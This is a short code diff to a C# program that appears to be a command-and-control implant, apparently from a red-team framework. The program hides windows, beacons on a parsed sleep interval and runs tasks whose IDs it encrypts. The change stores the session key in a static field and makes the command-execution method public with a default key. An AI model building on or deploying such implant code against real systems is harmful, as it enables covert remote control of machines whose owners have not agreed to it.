@@ -23,6 +23,7 @@ public class Program
 	public const int SW_HIDE = 0;
 	public const int SW_SHOW = 5;
     public static string taskId;
+    private static string pKey;
 
 	public static void Sharp()
 	{
@@ -403,7 +404,11 @@ public class Program
 		}
 	}
 
-    static void Exec(string cmd, string taskId, string key, byte[] encByte = null) {
+    public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null) {
+		if (string.IsNullOrEmpty(key))
+		{
+		    key = pKey;
+		}
 		var eTaskId = Encryption(key, taskId);
 		var dcoutput = "";
 		if (encByte != null)
@@ -428,6 +433,7 @@ public class Program
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
 		ImgGen.Init(stringIMGS);
+		pKey = Key;
 		int beacontime = 5;
 		var ibcnRgx = new Regex(@"(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
 		var imch = ibcnRgx.Match(Sleep);
